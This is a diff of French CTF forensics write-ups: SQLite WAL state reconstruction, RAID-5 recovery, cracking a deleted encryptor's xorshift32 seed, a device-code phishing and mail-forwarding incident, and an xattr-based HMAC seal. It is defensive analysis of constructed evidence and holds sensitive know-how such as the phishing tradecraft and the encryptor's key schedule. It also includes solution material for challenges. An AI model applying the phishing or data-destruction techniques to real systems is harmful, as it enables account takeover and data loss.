-`export-profile.md` est la vraie spécification : le worker lance une transaction IMMEDIATE qui interroge les parcelles du manifeste, prépare l'export, passe `export_job` de `QUEUED` à `COMPLETED` et commit. L'export est la requête exacte du profil sur l'état du registre **à ce commit** (pas une vue ultérieure), avec le reçu `delivery.csv` comme `manifest` (douze parcelles, ordre de livraison), un TSV à en-tête fixe, fins de ligne LF, haché en SHA-256. La base fait 9 pages (4096 o), le WAL 32 + 9 × (24 + 4096) = 37 112 octets, donc 9 frames. Le README interdit d'ouvrir les originaux avec SQLite (cela créerait un `-shm` et pourrait checkpointer) ; je n'ai donc jamais ouvert les originaux : tout est parsé à la main et reconstruit dans des copies temporaires. `SHA256SUMS` correspond pour tous les fichiers.
-
-**2. Hypothèse — une vue « au commit N » = base + les frames jusqu'au N-ième commit**
-
-D'après le format WAL de SQLite : en-tête `0x377f0682`, taille de page 4096, sels ; chaque frame a un en-tête de 24 octets (numéro de page, **taille de la base après commit** — non nulle seulement sur une frame de commit —, sels, checksum cumulatif) suivi de l'image de la page. Un lecteur au commit N voit, pour chaque page, la dernière frame ≤ N, et la base pour les autres pages. J'ai donc :
-
-1. validé le checksum de l'en-tête et, pour chaque frame, les sels et le checksum cumulatif (l'ordre des octets des mots dépend du magic) : les 9 frames sont valides ;
-2. listé les commits : frames 0, 2, 4, 5, 7, 8 — une transaction peut couvrir plusieurs frames (ex. frames 1+2, 3+4, 6+7), donc un état ne doit être construit qu'à une frame de commit, jamais au milieu d'une transaction ;
-3. construit une image de base simple pour chaque commit (base + frames ≤ N, plus de WAL) et interrogé `export_job`.
-
-**3. Exploitation — le commit de transition contient les lignes altérées**
-
-| Frame de commit | `LR-731` | SHA-256 de l'export (premiers octets) |
-|---|---|---|
-| base | pas de ligne | — |
-| 0 | pas de ligne | `04a47a…` |
-| 2 | pas de ligne | `40f3b1…` |
-| 4 | `QUEUED` | `40f3b1…` |
-| **5** | **`COMPLETED`** | **`40f3b1…`** |
-| 7 | `COMPLETED` | `04a47a…` |
-| 8 | `COMPLETED` | `04a47a…` |
-
-La propriété des parcelles 1202, 1205, 1209 et 1214 est altérée entre les commits 0 et 2 (nouveaux titulaires `2127`–`2131`, nouveaux instruments `IN-9360472185`, `IN-8162094735`, `IN-7259841360`, `IN-6941538207`, et un partage 65/35 au lieu de 60/40 sur la parcelle 1209), toujours présente quand le job se termine à la frame 5, puis rétablie aux titulaires d'origine dans les derniers commits : c'est la « vue propre ultérieure » dont parle l'énoncé. L'export à la transition a 13 lignes (la parcelle 1209 a deux titulaires). L'ordre des parcelles vient de `delivery.csv`, celui des titulaires de `registry_ref COLLATE BINARY`.
-
-```bash
-python3 -I solve/solve.py files
-```
-
-Le script fait tout cela (parsing du WAL, validation des checksums, état par commit, requête, hash) et affiche le flag ; il ne lit que les originaux et écrit dans un répertoire temporaire.
-
-Script de résolution : `solve/solve.py` (voir l'annexe)
-
-#### Flag
-
-`CSCTF{last_commit_<64 hex>}` (masqué)
-
-#### Réflexions
-
-- « L'état courant » et « l'état à la transaction X » sont deux choses différentes : en mode WAL, la réponse est dans la séquence de frames, pas dans ce que renvoie une ouverture normale avec `sqlite3`.
-- Seules les frames de commit (taille de base non nulle) sont des états cohérents ; une transaction peut couvrir plusieurs frames, donc s'arrêter sur une frame quelconque donne une vue incohérente.
-- Le checksum cumulatif et les sels délimitent l'époque valide ; les valider évite d'utiliser des restes de générations WAL précédentes.
-- Le même hash apparaît aux commits 2, 4 et 5 et un autre aux commits 0, 7, 8 : comparer les hashes sur tous les commits montre quand l'altération a commencé et fini, pas seulement l'état livré.
-- La preuve a été préservée : aucune ouverture SQLite des originaux, travail sur des copies reconstruites.
-
-#### Outils & références
-
-- Python 3 (`struct`, `sqlite3` sur copies reconstruites uniquement, `hashlib`, `csv`)
-- Format de fichier et format WAL de SQLite (<https://sqlite.org/fileformat2.html>, <https://sqlite.org/walformat.html>)
-
-
-### Dawn Array
-
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
-|---|---|---|---|---|---|---|
-| forensics | 285 | 99 | ✅ | — | 0xAr3s-root | Chronos Security |
-
-#### Énoncé
-
-> During a state-sponsored attempt to isolate the eastern corridor, dispatch gateway E2 of the Rovenqara Rail Continuity Authority (RRCA) issued conflicting turnout-release records and was then powered off. RRCA runs the rail lines that carry coalition supply in the Operation Dawn theatre, and the corridor stays shut until responders know which releases the corridor controller actually acknowledged.
->
-> The gateway kept its staging volume on a four-member Linux md RAID-5 array; one member is lost and three raw members survive. Rebuild the volume read-only, then apply the gateway's own dispatch procedure, stored on that volume, to find the controller-acknowledged release witness, and report it in the form the procedure defines. This is a constructed recovery case built on real Linux md RAID-5, ext4, SQLite WAL, RFC 5424 and HTTP/1.1, not an acquisition from physical disks.
->
-> Attachment: `dawn-array.zip` (604,849 bytes, SHA-256 `e41e1a4c6b2b…05de66`)
->
-> Flag format: `CSCTF{dawn_<64 lowercase hex digits>}`
-
-**Fichiers fournis :** `files/dawn-array.zip` (non commité — actuellement dans `forensics/dawn-array.zip`)
-
-#### En bref
-
-Parser les superblocs md v1 pour la vraie géométrie (left-symmetric, chunks 32 Kio, data offset 1 Mio, rôles 0/2/3 présents), reconstruire le volume ext4 de 117 Mio en lecture seule, lire le ledger SQLite *avec son WAL appliqué*, et ne garder que les 16 cycles sur 128 dont réservation, readback et phases syslog concordent selon la procédure DP-7 — leur SHA-256 est le témoin.
-
-#### Démarche
-
-**1. Reconnaissance — inventaire, puis métadonnées avant les octets**
-
-```bash
-unzip -l dawn-array.zip
-# CASE-SHEET.txt  acq-1.raw  acq-2.raw  acq-3.raw (40 Mio chacun)  tools/raid5_extract.py
-```
-
-Note : la copie locale hashe différemment du SHA-256 affiché sur la plateforme (suffixe `…ad5de66` contre `…a05de66`) ; l'analyse ci-dessous travaille strictement depuis les octets fournis, et chaque couche se revalide (UUID d'array commun, label/UUID ext4, correspondance 1:1 ledger/syslog, 128 échanges HTTP propres).
-
-Chaque membre porte un superbloc md v1.2 à l'offset fichier `0x1000` (magie `0xa92b4efc`, nom `rrca-gw-e2:staging`). Décodé selon `/usr/include/linux/raid/md_p.h` (`chunksize` en secteurs, rôles via `dev_roles[dev_number]`) :
-
-| Membre | dev_number | rôle | layout | chunk | data offset | taille utile |
-|---|---|---|---|---|---|---|
-| acq-1.raw | 0 | **0** | 2 = left-symmetric | 64 secteurs = 32 Kio | 2048 secteurs = 1 Mio | 79872 secteurs |
-| acq-2.raw | 4 | **3** | idem | idem | idem | idem |
-| acq-3.raw | 2 | **2** | idem | idem | idem | idem |
-
-Le membre perdu est donc le rôle 1 (parité recalculée), taille logique `3 × 79872 × 512 = 122 683 392` octets. Un premier balayage naïf (chasse à la magie ext4 sur permutations rôles/chunk/layout) a produit des centaines de hits car la redondance du stripe-0 duplique le superbloc sur deux membres — ce sont les rôles du superbloc qui tranchent, pas la magie.
-
-**2. Hypothèse — lire DP-7 avant de croire un seul enregistrement**
-
-Le volume (`rrca-staging`, UUID `e195b486-…`) contient exactement les trois types de preuves nommés par la procédure : `var/lib/rrca/dispatch.sqlite` (+ `-wal` de 552 Kio, `-shm`), `var/log/rrca/dispatch-gateway.syslog` (512 enregistrements RFC 5424, SD-ID `rrca@32473`) et `var/log/rrca/controller-access.pcapng` (2432 frames, 128 connexions loopback `10.61.4.10 → 10.61.4.21:8080`, chacune exactement POST/201 + GET/200).
-
-DP-7 (`usr/share/doc/rrca-dispatch-procedure.txt`) définit la qualification Q1–Q5 : une ligne ledger + une de chacune des quatre phases syslog partageant `(cycle_id, request_id, gateway_seq)` dans l'ordre ; headers/corps POST conformes à la ligne avec écho 201 ; révision/nonce de réponse conformes ledger *et* syslog ; GET nommant la même requête avec une vue readback conforme réponse et ledger ; readback syslog conforme ledger. Tout doublon, non-succès, corps manquant ou désordre disqualifie.
-
-Deux pièges en découlent directement : (a) 33 des 128 lignes ledger (`gateway_seq` 96–128) ne vivent **que dans le WAL** — une lecture du seul fichier principal les perd silencieusement, dont les cycles qualifiants 103/110/117 ; (b) les statuts seuls ne qualifient rien — les 128 échanges sont 201/200 sur le fil, et seuls 16 cycles survivent à la comparaison champ par champ.
-
-**3. Exploitation — reconstruire, puis filtrer**
-
-```bash
-python3 solve/solve.py ../dawn-array.zip
-# [*] md RAID-5: layout=left-symmetric chunk=32768 data_off=1048576
-#                array=122683392 roles=[0, 2, 3] missing=1
-# [*] Rebuilt 122683392 logical bytes, ext4 magic OK
-# [*] Ledger        : 128 rows (WAL applied)
-# [*] Syslog        : 512 records, 128 cycles
-# [*] Capture       : 128 connections, POST/201 + GET/200 each, no pipelining
-# [*] Qualifying    : 16 cycles
-# [*] Qualifying gateway_seq: 14,15,34,35,55,69,78,79,80,83,85,87,95,103,110,117
-# [+] FLAG            : CSCTF{...}
-```
-
-Le solveur dérive la géométrie des superblocs, délègue le brassage d'octets au `raid5_extract.py` fourni, extrait les fichiers en lecture seule via `debugfs` (ni montage, ni root), réassemble TCP/HTTP en Python pur, et vérifie chaque clause DP-7 — abandonnant plutôt que d'émettre un témoin si une attente structurelle casse. Les 112 rejets forment quatre classes nettes : nonce de réponse différant ledger+syslog (29), révision de réponse différant de `prepare_revision` (28), registres/valeurs du readback GET montrant la vue divergente du contrôleur (24, registres en `90xx`), et valeur du `READBACK_OBSERVED` syslog contredisant la ligne commise (31, toujours le bit `release_value`). Témoin = header 21 octets `RRCA-DAWN-WITNESS-v1\n` + 16 lignes `|` dans l'ordre croissant des `gateway_seq` (1733 octets), dont le SHA-256 est le corps du flag.
-
-Script de résolution : `solve/solve.py` (voir l'annexe)
-
-#### Flag
-
-`flag{...}` (masqué)
-
-#### Ce que j'ai appris
-
-- La chasse à la magie est un oracle faible sur array redondant : la parité du stripe-0 faisait apparaître le superbloc ext4 sous presque toutes les géométries. Les `dev_roles[]` md (ni les noms de fichiers, ni la magie) sont la vérité terrain pour l'ordre des membres.
-- Le WAL fait partie de la base : ouvrir le SQLite sans son `-wal` (ou n'extraire que `dispatch.sqlite` de l'image) perd les cycles 96–128 et donne un témoin de 13 lignes au hash faux. Copier le trio, ouvrir normalement, compter 128.
-- Le « HTTP status alone does not qualify » de DP-7 est littéral ici — les 128 échanges sont 201/200 sur le fil. La discrimination tient entièrement à l'accord nonce/révision/registre/valeur entre quatre sources (ledger, syslog, réponse de réservation, vue readback).
-
-#### Outils et références
-
-- Python 3 stdlib (`struct`, `hashlib`, `sqlite3`, `zipfile`) + `debugfs` (dumps lecture seule) + `tools/raid5_extract.py` fourni
-- `capinfos`/`tshark` (recon capture : 128 connexions × 19 frames)
-- Layout superbloc md v1 (`md_p.h`) ; algorithmes RAID-5 mdadm (2 = left-symmetric) ; magie superbloc ext4 `0x53EF` ; mode WAL SQLite ; structured data RFC 5424
-
-
-### Ghost in the Historian
-
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
-|---|---|---|---|---|---|---|
-| forensics | 275 | 107 | ✅ | — | 0xAr3s-root | Mohamed Amine Mzoughi |
-
-#### Énoncé
-
-> A campaign against the electricity supply encrypted a substation historian's configuration and deleted the encryptor. The substation feeds a partner nation's grid on the coalition side of Operation Dawn.
->
-> Recover the original configuration's `SAFETY_INTERLOCK_TOKEN` and submit its complete `CSCTF{...}` value. The volume was constructed for this exercise and is not an untouched acquisition; the included brief explains its timeline. Analyze recovered programs as data: do not execute them or mount the image.
->
-> Attachment: `ghost-in-the-historian.zip`, 72,560 bytes, SHA-256 `5edaea927aa93db3286f771dd77c8c41e0c23c6eafa70ac2182da5bd9ac56ce9`
-
-**Fichiers fournis :** `files/ghost-in-the-historian.zip` (non commité — actuellement dans `network/ghost-in-the-historian.zip`)
-
-#### En bref
-
-Carver le `historian_enc` ELF supprimé depuis l'espace non alloué, lire son désassemblage comme des données (flot xorshift32, graine `(time() ^ getpid()) × 0x9E3779B1`, PID issu de sa propre ligne syslog), brute-forcer les secondes autour du sweep de 04:13, puis déchiffrer en chaîne les trois configs `.enc` — le fichier topologie contient le token.
-
-#### Démarche
-
-**1. Reconnaissance — un petit monde ext4 avec trois fichiers verrouillés**
-
-Le ZIP se vérifie (`5edaea92…56ce9`) et contient un descripteur VMDK plus une extent flat de 64 Mio (`evidence-flat.vmdk`, 131072 secteurs, `manifest.sha256` couvre les trois fichiers). `debugfs` en lecture seule, jamais de montage :
-
-```bash
-debugfs -R "ls -l /" evidence-flat.vmdk
-# /var/historian → node_status.json.enc (74 o), grid_topology.cfg.enc (235 o),
-#                  historian_cache.dat.enc (64 o), tous datés 2-oct-2026 05:13
-# /var/log/historian.log → une ligne : 2026-10-02 04:13 historian_enc[2764964] :
-#                          starting encryption sweep, target_dir=/var/historian
-```
-
-Le brief README est explicite sur les deux horloges (filesystem construit le 29 oct., enregistrements d'incident du 2 oct. — chacun vaut ce qu'il dit) et les règles d'engagement : les programmes récupérés sont des données. `lsdel` ne trouve aucun inode supprimé et le journal est une transaction vide, mais `strings` sur l'extent brute révèle la suite : une note de rançon (« Contact ref: 7F3A-RECOVERY (this is NOT a decryption key) », wallet d'affichage) et, juste à côté, un second programme complet — imports libc (`scandir`, `fwrite`, `unlink`, `utime`, `getpid`), formats de chemins (`%s/%s`, `%s.enc`, `rb`/`wb`) et le format exact du log ci-dessus. Un seul ELF (`7fELF`) à l'offset `0xa1c000` ; carvé via ses section headers (`0x3888` octets, BuildID intact), c'est l'encryptor supprimé. La chaîne `@z3uAF2` à proximité n'est que des octets de chiffré de `grid_topology.cfg.enc`, pas une clé — un leurre naturel.
-
-**2. Hypothèse — le binaire documente son propre key schedule**
-
-Le désassemblage `.text` (strippé, ~1,2 Kio — lu, jamais exécuté) est un sweep linéaire : `scandir`, saut des dotfiles, saut des non-fichiers, `fopen(rb)` → `ftell`/`fread`, chiffrement, `fopen(wb)` vers `%s.enc`, `utime` (d'où les mtimes uniformes du 2 oct.), `unlink` de l'original. Le chiffrement est un xorshift32 de manuel (shifts 13/17/5, octets little-endian, état frais par bloc de 4 octets) :
-
-```
-seed = 0xa5a5a5a5; t = time(); pid = getpid()
-if (t != pid) seed = (t ^ pid) * 0x9E3779B1   (mod 2^32)
-état conservé d'un fichier à l'autre (resauvegardé après chacun)
-```
-
-Les inconnues sont donc exactement deux : les secondes de graine `t` et l'ordre des fichiers (l'ordre scandir décide qui reçoit l'état de graine). La ligne de log écrite par le binaire lui-même donne les deux ancres : le PID `2764964` verbatim, et la minute du sweep `04:13` bornant `t` — brute-forcer les 86400 secondes du jour, et la config qui se déchiffre depuis l'état de graine doit être de l'ASCII imprimable commençant par `#`.
-
-**3. Exploitation — un jour de secondes, puis suivre la chaîne**
-
-```bash
-python3 solve/solve.py ../ghost-in-the-historian.zip
-# [*] Sweep log     : 2026-10-02 04:13 historian_enc[2764964]
-# [*] Seed time     : 2026-10-02 04:13:05+00:00 (t=1790914385) seed=0x40d8e565
-# [*] Chain order   : grid_topology.cfg.enc -> historian_cache.dat.enc
-#                     -> node_status.json.enc
-# [+] FLAG            : CSCTF{...}
-```
-
-`t = 04:13:05` (cinq secondes dans la minute loggée — exactement ce que prédit le double appel `time()`) déchiffre `grid_topology.cfg.enc` directement depuis l'état de graine vers sa config, dont `SAFETY_INTERLOCK_TOKEN=flag{...}`. Enchaîner l'état survivant (`235 o → 59 états`) déchiffre `historian_cache.dat` (CSV de pressions `04:11Z/04:12Z`) puis `node_status.json` (JSON valide, `MGA-HIST-07`, `nominal`) ; l'ordre inverse échoue l'imprimabilité, confirmant `grid → cache → node`. Mon premier sweep du jour entier avec un seuil conjoint sur 3 fichiers n'a rien trouvé — à juste titre, car seul le premier fichier dans l'ordre scandir se valide depuis la graine ; scorer le fichier grid seul touche à 235/235 imprimables au premier passage (~5 s).
-
-Script de résolution : `solve/solve.py` (voir l'annexe)
-
-#### Flag
-
-`flag{...}` (masqué)
-
-#### Ce que j'ai appris
-
-- Analyser-comme-données fonctionne : imports + rodata (`%s.enc`, `rb`/`wb`, le format de log) esquissent déjà le programme avant tout désassemblage, et le `.text` de 1,2 Kio confirme schedule de graine, chaînage, clonage de timestamps et suppression en une lecture.
-- Le PID-dans-le-log est le raccourci voulu — le binaire loggue son propre `getpid()` en `%d`, réduisant la recherche de graine à une dimension (les secondes d'un jour). Sans lui, l'espace conjoint `(t, pid)` resterait brute-forçable mais bien plus laid.
-- Le sweep à seuil conjoint qui a échoué était instructif, pas perdu : le report d'état fait qu'un seul fichier se valide depuis la graine, donc scorer par fichier avec une seconde étape de chaînage est la bonne forme — et l'ordre qui échoue l'imprimabilité est lui-même une preuve de l'ordre qui réussit.
-
-#### Outils et références
-
-- Python 3 stdlib (`struct`, `hashlib`, `zipfile`) + `debugfs` (dumps lecture seule, `lsdel`, `logdump`)
-- `strings`, `objdump -d -M intel` (triage statique/désassemblage — binaire jamais exécuté)
-- Extent flat ext4 en VMDK monolithicFlat ; xorshift32 (shifts Marsaglia 13/17/5) ; ligne syslog comme oracle de PID
-
-
 ### Briefing for One
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| forensics | 270 | 82 | ✅ | — | 0xAr3s-root | Chronos Security |
+| forensics | 82 | ✅ | — | non | 0xAr3s-root | Chronos Security |
 
 #### Énoncé
 
@@ -1144,206 +692,86 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 - StringData Shell Link Windows, cellules NK/VK de hive registre, WebDAV (`PROPFIND`/`GET`) sur HTTP
 
 
-### Code Red Freight
+### Capability Ghost
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| forensics | 270 | 102 | ✅ | — | 0xAr3s-root | Marius Merai |
+| forensics | 106 | ✅ | — | non | 0xAr3s-root | Mohamed Amine Mzoughi |
 
 #### Énoncé
 
-> Tarnovel Rail Freight's defence-consignment manifests are reaching an outside mailbox. The dispatcher noticed nothing. You have her identity, mailbox-audit exports, and the email she clicked. Identify the device the adversary controls, the rule leaking manifests, and the number of files they downloaded.
+> A hostile-state campaign targeted the build runner for the software that drives signals on railways carrying coalition freight toward the Operation Dawn front. Responders kept the runner's filesystem archive and journal.
 >
-> This is a constructed incident-analysis case built from sanitized Microsoft Entra and Purview-style exports. Work only with the supplied evidence; do not contact domains, addresses, or services named in it.
+> Recover the sealed marker from them. Inspect the records as data: do not run the supplied programs or restore their capabilities. Linux tools or WSL are enough, and you do not need root. This is a constructed forensic exercise, not evidence of an actual compromise.
 >
-> Attachment: `code_red_freight.zip`
+> Attachment: `capability-ghost.zip`, 51,023 bytes, SHA-256 `c53a83833466cc4db34336ab9e333a0e317cd48da43932953df89cacb9c31ffe`.
 >
-> Flag format: `CSCTF{device_rule_count}` (ex. `CSCTF{DESKTOP-XXXX_ForwardRule_42}` — illustratif uniquement)
+> Submit the complete recovered `CSCTF{...}` value. Flag format: `CSCTF{...}`
 
-**Fichiers fournis :** `files/code_red_freight.zip` (non commité — actuellement dans `forensics/code_red_freight.zip`)
+**Fichiers fournis :** `files/runner-fs.tar.gz`, `files/runner.journal`, `files/README_FOR_RESPONDERS.md`, `files/manifest.sha256` (non commités).
 
 #### En bref
 
-Phishing device-code (`microsoft.com/devicelogin` + leurre de partage lookalike) ayant donné à l'attaquant une session Entra depuis Montréal ; le dispositif Azure AD pirate, la règle de boîte vers l'externe et les événements SharePoint `FileDownloaded` pointent tous vers le même IP/dispositif — les trois parties du flag sont dérivées à l'étape 3 (`flag{...}` masqué).
+`/etc/solunet/signaling-cfg.sealed` est XORé avec une clé que `hc-probe` dérive en `HMAC-SHA256(tag, epoch)` : le tag est l'xattr `user.build_seal` conservé dans les en-têtes PAX du tar, l'epoch est le champ `X_SEAL_EPOCH` du journal ; recalculer la clé hors ligne déchiffre le marqueur → flag.
 
 #### Démarche
 
-**1. Reconnaissance — inventorier et séparer les deux mondes**
+**1. Reconnaissance — un tar avec xattrs, un journal et une config détruite**
 
-```bash
-unzip -l code_red_freight.zip
-# logs/AuditLogs_2026-10-29-Patti_Fernandez.csv          (12 lignes)
-# logs/InteractiveSignIns_2026-10-28_2026-10-29.csv      (18 lignes)
-# logs/NonInteractiveSignIns_2026-10-28_2026-10-29.csv   (256 lignes)
-# logs/UnifiedAuditLog_Patti.csv                         (188 lignes)
-# lure/email_phish.png  lure/devicecode_phish.png
+`runner-fs.tar.gz` contient une petite arborescence : `/etc/solunet/signaling-cfg.sealed` (27 octets), `/usr/local/bin/hc-probe`, `backup-sync`, `ping`, une unité `hc-probe.service` et `/root/.bash_history`. L'historique raconte la scène : `setcap` sur `hc-probe`, un `TAG` aléatoire, `setfattr -n user.build_seal`, un `EPOCH=$(date +%s)`, puis `hc-probe --seal "$TAG" "$EPOCH" signaling-cfg signaling-cfg.sealed` et `shred -u` du clair. Le clair est donc perdu ; la seule voie est d'inverser le scellement avec le bon tag et la bonne epoch.
+
+Les xattrs ne sont pas appliqués à l'extraction (pas de root), mais ils sont stockés dans les en-têtes PAX étendus en `SCHILY.xattr.*`. Le `tarfile` de Python les expose dans `pax_headers` :
+
+```python
+import tarfile
+for m in tarfile.open("files/runner-fs.tar.gz"):
+    print(m.name, m.pax_headers)
 ```
 
-Les leurres racontent l'histoire avant tout log : un email de `ragubarden@proton.me` (« Jordan Smith shared Draft_Budget_v2.docx ») pointe vers `https://Sharepoint.cz/584c39f3-…`, et la fausse page OneDrive demande `microsoft.com/devicelogin` + code `CXR7QK2WD` — phishing device-code classique. Deux IP séparent ensuite proprement tous les logs : la dispatcher Patti sur `198.51.100.24` (Bucuresti/Timisoara) contre l'attaquant sur `203.0.113.77` (Montréal).
+`hc-probe` porte `security.capability` et `user.build_seal` = `50 9d f6 cd 8e 10 3f a5` (8 octets bruts ; `tarfile` l'affiche comme une chaîne UTF-8 avec échappements surrogate, donc je ré-encode en `surrogateescape` pour retrouver les octets). `backup-sync` a un `user.sync_id` et `ping` une capability, mais c'est du bruit.
 
-Le `Register device` d'AuditLogs concrétise la séparation — une ligne par monde :
+**2. Hypothèse — le binaire documente son propre schéma ; l'epoch est dans le journal**
 
-| Date | Dispositif | IP | DeviceId |
-|---|---|---|---|
-| 2026-10-28 07:12 | `R3M0TE-W0RK-PC` (référence) | 198.51.100.24 | `3f8c1a7b-…` |
-| 2026-10-29 15:05 | `D3VC0DE-R3L4Y` (pirate) | 203.0.113.77 | `95caec44-…` |
-
-Les connexions interactives confirment le mécanisme : l'enregistrement pirate suit une paire `deviceCodeFlow` / `Authentication Protocol: deviceCode` sur `Microsoft Authentication Broker → Device Registration Service` depuis l'IP attaquante (échec 50199 « user interaction required » à 15:04:52, succès à 15:04:55), après quoi chaque session attaquante est liée `deviceCodeFlow`, `Azure AD joined`, avec le DeviceId `95caec44-…` (40 lignes non interactives ; le monde bénin a un DeviceId vide partout).
-
-**2. Hypothèse — un dispositif, une règle, ne compter que ses téléchargements**
-
-Avec le DeviceId attaquant fixé (`95caec44-c8af-4786-976c-73bd33d9d143`), l'Unified Audit Log est sans ambiguïté :
-
-- `New-InboxRule` apparaît exactement deux fois. La règle bénigne `Newsletters` (2026-10-28, IP/session de la dispatcher, `MoveToFolder` + `FromAddressContainsWords`, sans DeviceId) est la référence ; la règle `M4N1F3ST-L3AK` du 2026-10-29T15:28:57 vient de `203.0.113.77:17091` sur la session attaquante `009d0b3a-…`, porte le DeviceId attaquant, pose `ForwardTo = ragubarden@proton.me` (l'expéditeur du leurre) avec `StopProcessingRules = True`. Nom, destination et dispositif convergent.
-- `FileDownloaded` apparaît exactement 4 fois — tous depuis `203.0.113.77`, tous en UA `Microsoft Teams`, aucun depuis l'IP de la dispatcher : `Investor Relations Meeting Presentation.pptx`, `aerialshot.jpg`, `Local Resource Guide.docx`, `Notes.docx` (15:20:24–15:21:36). Les lignes `FileAccessed`/`FileModified` d'autres IP (plages service/MFA) sont des lectures et du bruit de synchro, pas des téléchargements, et les lignes `MailItemsAccessed` ne portent aucun signal IP attaquant — le compte est donc 4, pas 30.
-
-**3. Exploitation — dériver, pas coder en dur**
+Je n'ai pas exécuté `hc-probe`. Un `strings` suffit : son aide indique que `--seal` et `--unseal` sont la même opération, un XOR à clé répétée avec `key = HMAC-SHA256(key = octets_bruts(tag_hex), msg = décimal_ascii(seal_epoch))`, `out[i] = in[i] XOR key[i mod 32]`. Il précise aussi d'où vient l'epoch : le champ `X_SEAL_EPOCH` de l'entrée de journal de ce run, **pas** l'horodatage de l'entrée elle-même.
 
 ```bash
-python3 solve/solve.py ../code_red_freight.zip
-# [*] Device registrations:
-#     2026-10-29T15:05:03 ... D3VC0DE-R3L4Y ip=203.0.113.77 deviceId=95caec44-…
-#     2026-10-28T07:12:03 ... R3M0TE-W0RK-PC ip=198.51.100.24 deviceId=3f8c1a7b-…
-# [*] Inbox rules:
-#     2026-10-29T15:28:57 name=M4N1F3ST-L3AK ip=203.0.113.77:17091 device=95caec44-… forward=ragubarden@proton.me
-#     2026-10-28T07:34:27 name=Newsletters ip=198.51.100.24:51224 forward=None move=Newsletters
-# [*] FileDownloaded events: (4, tous 203.0.113.77)
-# [+] FLAG            : CSCTF{...}
+journalctl --file=files/runner.journal --no-pager -o json
 ```
 
-Le solveur vérifie chaque lien (DeviceId de la règle == dispositif pirate, tous les téléchargements depuis l'IP attaquante, référence bénigne présente) au lieu de faire confiance aux noms : une variante aux noms changés se résoudrait quand même — ou échouerait bruyamment plutôt que d'émettre un faux flag.
+L'entrée 5 (`hc-probe`, « health probe sealed result written ») a `X_SEAL_EPOCH=1793294042`, alors que son `__REALTIME_TIMESTAMP` donne 1793294054 — 12 s plus tard : c'est le piège. Deux autres pièges sur le tag : le `TAG` de `.bash_history` n'est qu'une variable du shell d'origine (aléatoire, non enregistrée), et la commande shell stockait l'xattr sous forme de chaîne ASCII `0x…`, alors que l'archive contient les octets bruts ; c'est l'xattr de l'archive qui fait foi.
+
+**3. Exploitation — recalculer la clé hors ligne et XORer**
+
+```bash
+python3 -I solve/solve.py files
+```
+
+Le script lit le tag dans les en-têtes PAX, l'epoch dans le journal (via `journalctl --file`), dérive la clé et XORe le fichier scellé. Un mauvais tag ou une mauvaise epoch donnerait des octets aléatoires ; ici la sortie commence par `CSCTF{` et est imprimable, ce qui confirme les deux valeurs.
 
 Script de résolution : `solve/solve.py` (voir l'annexe)
 
 #### Flag
 
-`flag{...}` (masqué)
+`CSCTF{...}` (masqué)
 
-#### Ce que j'ai appris
+#### Réflexions
 
-- Les noms leet (`D3VC0DE-R3L4Y` = device-relay, `M4N1F3ST-L3AK` = manifest-leak) confirment la réponse mais ne doivent pas *être* la méthode : la liaison par DeviceId (enregistrement → sessions → règle) et la séparation par IP sont la vraie preuve, et elles survivraient à des leurres renommés.
-- `FileDownloaded` ≠ `FileAccessed` : compter chaque toucher SharePoint gonfle le nombre. Seule l'opération `FileDownloaded` avec l'IP attaquante compte — le solveur impose que les 4 viennent d'une seule IP.
-- La règle bénigne `Newsletters` est le contrôle fourni par le challenge : même opération, IP/session/dispositif/paramètres différents. La vérifier d'abord fait ressortir la règle malveillante au lieu d'être « la première règle trouvée ».
+- Les métadonnées d'archive (xattrs PAX) sont une preuve à part entière : un simple `tar -x` en non-root les perd silencieusement, il faut donc lire les en-têtes.
+- Quand un outil documente son propre schéma, lire les strings du binaire avant tout ; ici il signalait aussi le piège de l'epoch (champ du journal vs. heure de l'entrée).
+- Un déchiffrement correct se valide lui-même (sortie imprimable avec le préfixe `CSCTF{`), un bon contrôle quand plusieurs entrées candidates existent.
+- Rien n'a été exécuté, extrait en root ni restauré : toute la résolution est de l'analyse de données.
 
-#### Outils et références
+#### Outils & références
 
-- Python 3 stdlib (`csv`, `json`, `zipfile`) — aucune dépendance
-- Visionneuse d'images (PNG leurres — lecture seule, jamais ouvrir les liens)
-- Sémantique Entra / UAL Purview : flux deviceCode, `Register device`, `New-InboxRule` (`ForwardTo`), `FileDownloaded`
-
-
-### Interlock Witness
-
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
-|---|---|---|---|---|---|---|
-| forensics | 270 | 99 | ✅ | — | 0xAr3s-root | Chronos Security |
-
-#### Énoncé
-
-> While the response-cell interlock read false, a fictional grid-support station feeding an allied depot network that Operation Dawn relies on accepted maintenance writes. The controller took syntactically valid Modbus/TCP writes, and the supplied safety policy is an offline response-cell rule, not a controller feature.
->
-> Reconstruct the accepted target writes that violate the policy and derive the incident witness. Work from the supplied files only.
->
-> Attachment: `interlock-witness.zip`, 15,307 bytes, SHA-256: `d46d5b2b820e412db288dde2a3a3f991990622a702708cb9fc13e498d223995`
->
-> Submit: `CSCTF{<64 lowercase hex characters>}`
-
-**Fichiers fournis :** `files/interlock-witness.zip` (non commité — actuellement dans `forensics/interlock-witness.zip`)
-
-#### En bref
-
-Rejouer hors ligne l'unique flux Modbus/TCP, suivre les trois mots d'interlock (`0x000A`/`0x000B`/`0x000C`) depuis les observations FC03 et les écritures FC16 acceptées, conserver les 16 écritures cibles (en `0x0013`/`0x0014`) émises pendant que l'interlock était faux, puis hacher `INTERLOCK-WITNESS/1\0 || PDU-requête||PDU-réponse…` en SHA-256.
-
-#### Démarche
-
-**1. Reconnaissance — vérifier le bundle et inventorier la capture**
-
-```bash
-sha256sum interlock-witness.zip
-# d46d5b2b820e412db288dde2a3a3f991990622a702708cb9fc13e498d223995  conforme
-unzip -l interlock-witness.zip
-# README.txt  interlock.pcapng  register-map.md
-# interlock-policy.md  witness-format.md  provenance.json  SHA256SUMS
-capinfos interlock.pcapng   # 512 frames, interface lo unique, tcp port 502
